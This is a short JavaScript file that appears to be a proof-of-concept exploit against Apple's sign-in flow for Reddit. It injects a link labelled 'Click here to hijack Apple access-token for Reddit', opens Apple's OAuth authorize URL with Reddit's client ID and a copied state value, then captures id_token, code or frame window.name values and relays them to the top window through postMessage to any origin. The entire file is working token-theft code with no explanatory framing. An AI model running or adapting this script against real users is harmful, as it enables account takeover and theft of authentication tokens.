var b, x;
var state = parent.location.href.substr(location.href.indexOf('state='));
var d = document.createElement('div');
if (!window.inited) {
  window.inited = true;
d.innerHTML = '<a href="#" onclick="b=window.open(\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\');">Click here to hijack Apple access-token for Reddit</a>';
parent.document.children[parent.document.children.length - 1].appendChild(d);
if(top!==parent.window) top.postMessage('stopinject', '*');
parent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };
x = setInterval(function() {
if(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {
  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();
  clearInterval(x);
};

}, 500);
}
